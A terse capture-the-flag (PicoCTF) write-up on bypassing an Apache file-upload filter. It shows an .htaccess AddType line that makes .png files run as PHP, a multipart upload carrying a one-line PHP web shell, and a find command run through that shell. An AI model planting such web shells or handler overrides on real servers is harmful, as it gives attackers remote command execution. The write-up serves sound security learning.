#upload #phpupload #htacess #bypassupload


![](../../PicoCTF-assets/Pasted%20image%2020260301124634.png)


Because it is apache 

![](../../PicoCTF-assets/Pasted%20image%2020260301124832.png)

```
AddType application/x-httpd-php .png
```

This will allow to make the system execute php command





```
------geckoformboundary1f2c2735b7ef17d5cc90171b1da6cbc
Content-Disposition: form-data; name="image"; filename="image.php.png"
Content-Type: application/x-php

<?php system($_GET['c']); ?>

------geckoformboundary1f2c2735b7ef17d5cc90171b1da6cbc--
```


![](../../PicoCTF-assets/Pasted%20image%2020260301124417.png)


![](../../PicoCTF-assets/Pasted%20image%2020260301124350.png)


```
?c=find / -name "*flag*" 2>/dev/null
```

![](../../PicoCTF-assets/Pasted%20image%2020260301124324.png)





![](../../PicoCTF-assets/Pasted%20image%2020260301124226.png)
